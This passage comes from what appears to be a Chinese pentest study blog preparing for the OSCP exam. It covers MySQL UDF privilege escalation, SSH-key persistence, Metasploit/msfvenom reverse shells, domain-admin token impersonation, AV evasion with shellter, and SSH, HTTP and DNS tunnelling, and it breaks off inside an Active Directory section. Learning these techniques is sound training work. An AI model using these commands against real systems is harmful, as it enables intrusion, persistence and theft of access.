lib_mysqludf_sys.so.hex</span><br></pre></td></tr></table></figure><p>用hex文件内容传入MySQL变量shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mysql执行</span></span><br><span class="line">set @shell = xxxxxxx;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看插件目录、文件操作权限</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mysql执行</span></span><br><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br><span class="line">show variables like &#x27;%secure_file_priv%&#x27;; # 如果没有权限写入插件目录，那就不能用UDF执行系统命令</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果有权限</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mysql执行</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将二进制shellcode转储到插件目录文件</span></span><br><span class="line">select binary @shell into dumpfile &#x27;/home/dev/plugin/udf_sys_exec.so&#x27;;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用库文件创建MySQL函数</span></span><br><span class="line">create function sys_exec returns int soname &#x27;udf_sys_exec.so&#x27;;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">验证函数创建成功</span></span><br><span class="line">select * from mysql.func where name=&#x27;sys_exec&#x27;;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">攻击机执行msfconsole，使用/exploit/multi/handler</span></span><br><span class="line">set PAYLOAD linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被控机器上下载shell并执行</span></span><br><span class="line">select sys_exec(&#x27;wget ...&#x27;)</span><br></pre></td></tr></table></figure><p>本地提权之后可以上传ssh公钥，保持长期访问权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh -keygen</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">mkdir /root/.ssh # 被控机器执行</span><br><span class="line">echo &quot;ssh-rsa AAAxxxxxxx...kali@kali&quot; &gt; /root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">SSH连接目标主机</span><br><span class="line">ssh root@sandbox.local</span><br></pre></td></tr></table></figure><p>也可以搜索数据库账号密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home/username</span><br><span class="line">cat ./bash_history</span><br></pre></td></tr></table></figure><p>如果已经拿下服务器，找到服务器中的挂载硬盘里的信息，里面有域的信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/fstab</span><br><span class="line">cd /mnt/scripts</span><br></pre></td></tr></table></figure><p>在服务器上生成ssh密钥并实现隧道</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">数据库服务器执行</span></span><br><span class="line">ssh -keygen</span><br><span class="line">cat /var/lib/mysql/.ssh/id _rsa.pub</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑kali上的authorized keys文件，添加DB服务器的SSH公钥配置</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">数据库服务器执行创建反向SSH隧道</span></span><br><span class="line">ssh -f -N -R 1080 -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=no&quot; -i /var/lib/mysql/.ssh/id rsa kali@KaliIP</span><br></pre></td></tr></table></figure><p>内网主机发现（ping扫描）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i &gt; nul &amp;&amp; echo 10.5.5.%i is up</span><br></pre></td></tr></table></figure><p>如果Windows执行whoami &#x2F;priv，发现是SelmpersonatePrivilege权限</p><p>就可以使用烂土豆提权（Juicy Potato 本地提权工具）</p><p>如果在msf中发现域管的令牌，可以直接伪造成域管理员</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use incognito</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">meterpreter &gt; impersonate_token sandbox\\Administrator</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">然后可以直接连dc</span><br></pre></td></tr></table></figure><h2 id="基础免杀"><a href="#基础免杀" class="headerlink" title="基础免杀"></a>基础免杀</h2><p>OSCP一般不考过Windows defender，充其量是过小红伞</p><p>使用shellter</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install shellter</span><br><span class="line">sudo apt install wine</span><br><span class="line">sudo dpkg --add-architecture i386 &amp;&amp; sudo apt update &amp;&amp; sudo apt -y install wine32</span><br><span class="line">shellter</span><br></pre></td></tr></table></figure><h2 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h2><p>基于字典去爆破，OSCP中如果把rockyou字典跑完之后还没有结果，基本上可以放弃这条路了</p><p>Kali Linux中包含密码字典</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/wordlists/</span><br><span class="line">/usr/share/seclist</span><br></pre></td></tr></table></figure><p>专属密码字典<br>通过添加特定目标组织的单词和短语来提高单词列表的有效性</p><p>向字典中添加特定企业的技术、产品名称、变形，提高其有效性</p><p>手动添加或使用cewl等工具生成专属字典</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt</span><br><span class="line">-m 6#最小6个字符</span><br></pre></td></tr></table></figure><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>auxiliary是探测类型的模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use 模块名</span><br><span class="line">search 关键字</span><br><span class="line">search type:auxiliary name:smb</span><br><span class="line">sessions 查看当前session</span><br><span class="line">session -i $id 进入指定的session</span><br><span class="line">run -j 后台运行</span><br><span class="line">bg 把当前session放到后台</span><br><span class="line">migrate $PID 进程迁移</span><br></pre></td></tr></table></figure><p>除了基本 Payload，Metasploit还包含多种高级 Payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Staged vs Non-Staged Payloads</span><br><span class="line">Non-Staged:不分阶段Payload 与EXP一起被完整地发送到目标系统</span><br><span class="line"></span><br><span class="line">Staged:分阶段Payload通常分为两部分</span><br><span class="line">第一部分较小，负责建立反弹连接，然后传输较大的第二部分Payload 并执行</span><br><span class="line">当没有足够的缓存空间来存储完整的Payload</span><br><span class="line">避免被AV软件发现，第一阶段不包含明显特征的恶意代码，利用其加载第二阶段代码到内存中执行</span><br></pre></td></tr></table></figure><p>名称中的‘&#x2F;’用来指示Payload是否分阶段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">不分阶段:shell_reverse_tcp</span><br><span class="line">分阶段:shell/reverse_tcp</span><br></pre></td></tr></table></figure><h2 id="Meterpreter-Shell"><a href="#Meterpreter-Shell" class="headerlink" title="Meterpreter Shell"></a>Meterpreter Shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search meterpreter type:payload</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br></pre></td></tr></table></figure><p>上传下载时目标主机路径要加双\</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\Offsec</span><br><span class="line">download c:\\Windows\\system32\\calc.exe /tmp/calc.exe</span><br></pre></td></tr></table></figure><p>msfvenom</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.12 LPORT=443 -f exe -o r.exe</span><br><span class="line">然后kali开侦听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/shell_reverse_tcp</span><br></pre></td></tr></table></figure><p>OSCP考试中不能用msf作跳板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route add 内网网段</span><br><span class="line">然后msf内部直接访问内网网段即可</span><br></pre></td></tr></table></figure><p>除了手动添加内网路由穿透内网，也可以使用autoroute模块，自动利用已建立的Meterpreter会话穿透内网</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; use multi/manage/autoroute</span><br><span class="line">msf5 post(multi/managelautoroute) &gt; sessions -l</span><br><span class="line">msf5 post(multi/managelautoroute) &gt; set session 4</span><br><span class="line">msf5 post(multi/manage/autoroute) &gt; exploit</span><br></pre></td></tr></table></figure><p>结合路由和server&#x2F;socks4a模块，配置socks4a代理，允许外部工具直接访问内网</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf5 post(multi/manage/autoroute) &gt; use auxiliary/server/socks4a</span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; set SRVHOST 127.0.0.1</span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; exploit -j</span><br></pre></td></tr></table></figure><p>配置Proxychains ,挂代理访问内网</p><h2 id="跨平台编译"><a href="#跨平台编译" class="headerlink" title="跨平台编译"></a>跨平台编译</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install mingw-w64</span><br><span class="line">i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe #报错</span><br><span class="line">i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32</span><br><span class="line"></span><br><span class="line">编译32位C语言Windows程序</span><br><span class="line">i686-w64-mingw32-gcc</span><br><span class="line">编译64位C语言Windows程序</span><br><span class="line">x86_64-w64-mingw32-gcc</span><br><span class="line">编译32位C++语言Windows程序</span><br><span class="line">i686-w64-mingw32-g++</span><br><span class="line">编译64位C++语言Windows程序</span><br><span class="line">x86_64-w64-mingw32-g++</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux和Windows常用命令</title>
      <link href="/2024/04/13/Linux%E5%92%8CWindows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2024/04/13/Linux%E5%92%8CWindows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>查找指定名称的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2&gt;/dev/null是将错误信息重定向到垃圾回收系统</span></span><br><span class="line">find / -name Settings.*  2&gt;/dev/null #looking through the files</span><br></pre></td></tr></table></figure><p><a href="https://www.ddosi.org/oscp-cheat-sheet-2/">https://www.ddosi.org/oscp-cheat-sheet-2/</a></p><p>which在$PATH环境变量中搜索指定名称的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">which sbd</span><br></pre></td></tr></table></figure><p>locate命令，通过搜索locate.db文件来定位目标文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用updatedb命令可升级locate.db</span></span><br><span class="line">sudo updatedb</span><br><span class="line">locate sbd.exe</span><br></pre></td></tr></table></figure><p>find 命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">彻底搜索文件系统</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">支持基于名称、时间、大小、所有者、文件类型、时间戮、权限等条件的搜索</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">搜索最近 24 小时修改过的文件</span></span><br><span class="line">find / -mtime 0  </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">搜索最近30分钟修改过的文件</span> </span><br><span class="line">find . -type f -iname &#x27;*.sh&#x27; -mmin -30 -ls </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">对搜索结果执行命令（删除）</span> </span><br><span class="line">find . -name .svn -exec rm -rfo &#123;&#125; \; </span><br><span class="line">find . -name .svn | xargs rm -rf </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">搜索启用 SUID 权限的文件</span></span><br><span class="line">find / -type f -perm -u=s -ls 2&gt;/dev/null </span><br></pre></td></tr></table></figure><p>查看系统中可用的服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files</span><br></pre></td></tr></table></figure><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>查看文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type $fileName</span><br></pre></td></tr></table></figure><p>查看所有文件（包括隐藏文件）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir /a</span><br><span class="line">#查看所有文件及其属性</span><br><span class="line">attrib * </span><br></pre></td></tr></table></figure><p>&#x2F;users目录中存放每个用户的个人目录，&#x2F;users&#x2F;public目录是共享目录，所有人都可以访问、写入，如果需要写入文件，可以在该目录下</p><p>&#x2F;users&#x2F;username&#x2F;Appdata是一个隐藏文件夹，&#x2F;users&#x2F;username&#x2F;Appdata&#x2F;Roaming是在域环境下可能包含用户配置文件的目录</p><p>查看远程目标主机的系统信息（前提是被控机器有目标机器的登录权限，或者知道域的用户名和密码）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo /s $hostname</span><br><span class="line">systeminfo /s $hostname domain\user /P password</span><br></pre></td></tr></table></figure><p>查看系统环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set</span><br></pre></td></tr></table></figure><p>搜索当前目录及子目录的文件(powershell)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dir /s $filename</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/p表示循环输出，不一次性输出</span></span><br><span class="line">dir /s *.exe /p</span><br><span class="line">tree /f &gt; tree.txt然后搜索tree.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用forfiles</span></span><br><span class="line">forfiles /p c:\windows /s /m notepad.exe /c &quot;command you want to execute&quot;</span><br></pre></td></tr></table></figure><p>使用whoami查看用户SID，管理员是5000，用户从1001开始</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\J0ker&gt; whoami /user</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">用户名                SID</span><br><span class="line">===================== =============================================</span><br><span class="line">desktop-kfa4a5s\j0ker S-1-5-21-2231775247-161512554-3901611509-1001</span><br></pre></td></tr></table></figure><p>查看当前用户权限，属于administrator组就有管理员权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure><p>查看文件权限，（F）表示所有权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls $fileName</span><br></pre></td></tr></table></figure><p>查看运行的所有进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用隧道搭建技术</title>
      <link href="/2024/04/13/%E5%B8%B8%E7%94%A8%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA%E6%8A%80%E6%9C%AF/"/>
      <url>/2024/04/13/%E5%B8%B8%E7%94%A8%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="使用rinetd进行端口转发"><a href="#使用rinetd进行端口转发" class="headerlink" title="使用rinetd进行端口转发"></a>使用rinetd进行端口转发</h2><p>所有WEB服务器80端口的请求重定向到216.58.207.142</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt install rinetd</span><br><span class="line"></span><br><span class="line">cat /etc/rinetd.conf</span><br><span class="line">0.0.0.0 80 216.58.207.142 80</span><br><span class="line"></span><br><span class="line">sudo service rinetd restart</span><br></pre></td></tr></table></figure><h2 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h2><h3 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h3><p>访问本机的端口，然后通过ssh隧道将访问本地端口的流量转发到目标主机的指定端口上</p><p>例如被控主机是10.11.0.128，内网主机是192.168.1.110(Windows 2016)，需要知道被控主机的SSH账号密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Kali运行</span></span><br><span class="line">sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128</span><br></pre></td></tr></table></figure><p>PS：由于Windows 2016默认不再支持SMBv1，因此建立隧道之前，需修改Kali本机 Samba服务配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/samba/smb.conf</span><br><span class="line">...</span><br><span class="line">min protocol = SMB2</span><br><span class="line">sudo /etc/init.d/smbd restart</span><br><span class="line">smbclient -L 127.0.0.1 -U Administrator</span><br></pre></td></tr></table></figure><h3 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h3><p>由远程被控主机反向连接Kali，建立SSH隧道，将Kali本地端口映射到内网主机端口</p><p>适用于被控主机允许出站访问</p><p>攻击机IP：172.16.8.144，内网主机IP：192.168.18.1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">方法1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">被控主机运行</span></span><br><span class="line">ssh -N -R 172.16.8.144:7070:192.168.18.1:80 kali@172.16.8.144</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">运行结束之后可以在Kali上看到开了7070端口（ss -pantu查看），然后访问Kali的7070端口都会转发到目标主机的80端口</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">方法2</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">被控主机运行</span></span><br><span class="line">ssh -N -R 9090 kali@172.16.8.144</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">发送到Kali 9090端口的流量都会通过被控机器转发到目标内网网段，而不是指定的某一个端口，这种方式可以用来扫描内网端口，这个9090相当于一个socks代理，可以挂上proxychain来扫</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">方法3</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Kali运行</span></span><br><span class="line">ssh -N -D 127.0.0.1:6060 user@172.16.8.136</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">然后同方法2，但是需要知道目标机器的ssh账号密码</span></span><br></pre></td></tr></table></figure><p>有的Windows系统没有自带的ssh，需要上传一个plink.exe，在Kali上&#x2F;user&#x2F;share&#x2F;windows-binaries</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plink.exe -ssh -l kali -pw kali -R 172.16.8.144:5050:192.168.18.1:80 172.16.8.144</span><br></pre></td></tr></table></figure><h2 id="使用netsh进行端口转发"><a href="#使用netsh进行端口转发" class="headerlink" title="使用netsh进行端口转发"></a>使用netsh进行端口转发</h2><p>windows上（需要管理员权限）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=8080 listenaddress=本地IP地址 connectport=80 connectaddress=目标IP地址</span><br></pre></td></tr></table></figure><h2 id="HTTP隧道"><a href="#HTTP隧道" class="headerlink" title="HTTP隧道"></a>HTTP隧道</h2><p>如果ssh流量被限制，可以走HTTP协议</p><p>使用chisel</p><p>kali搭建chisel服务端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel server -p 4040 --reverse</span><br></pre></td></tr></table></figure><p>Windows运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel.exe client 目标IP:4040 R:socks</span><br></pre></td></tr></table></figure><p>然后使用proxychain配置socks5代理，然后扫内网</p><h2 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h2><p>攻击机需要搭建成DNS server</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install dnscat2</span><br><span class="line"># 创建域名</span><br><span class="line">dnscat2-server test.com</span><br><span class="line"># 把dnscat的客户端放到被控主机上（只支持Linux）</span><br><span class="line">ls -l /usr/bin/dnscat</span><br><span class="line"># 被控主机运行</span><br><span class="line">dnscat --dns server=$IP,port=53</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AD域身份认证及横向移动</title>
      <link href="/2024/04/13/AD%E5%9F%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
      <url>/2024/04/13/AD%E5%9F%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h2><p>Active Directory域在大型企业中实现集中的系统、帐号、应用、数据访问管理</p><p>域是一个安全边界，加入域的计算机之间彼此存在信任关系</p><p>由于AD可以是一个非常复杂和细粒度的管理层，它的攻击面非常大</p><p>AD攻击方法主要包括枚举、身份认证、横向纵向移动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AD安装</span><br><span class="line">前提条件:静态IP地址（主机名dc01)</span><br><span class="line">服务器管理,点击“添加角色和功能”</span><br><span class="line">勾选“Active Directory域服务”，单击“下一步”</span><br><span class="line">安装完成后，右上角单击叹号图标，单击“将此服务器提升为域控制器”。</span><br><span class="line">DC 安装完成后，将计算和成员服务器加入活动目录域</span><br></pre></td></tr></table></figure><p>简单来说，就是活动目录记录了域内的机器各自的功能，比如邮件服务、数据库服务等这些服务都在哪里，域内的机器可以去活动目录中找到自己想要访问的服务在哪台机器上</p><p>资源集中存储，资源集中管理，活动目录里所有的资源存放在活动目录数据库中，域内的设备都受DC的集中管理，域账号可以访问域内所有的应用</p><p>集中身份认证，所有人使用域账号登录域内的计算机都需要去DC上做身份认证 </p><h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><p>前提是已经拿到本地管理员权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示域内所有的用户</span></span><br><span class="line">net user /domain</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示指定用户的详细信息，属于哪个组</span></span><br><span class="line">net user $name /domain</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示域内所有组</span></span><br><span class="line">net groups /domain</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示指定组的信息（无法发现目标组的二级组）</span></span><br><span class="line">net groups $groupName /domain</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span 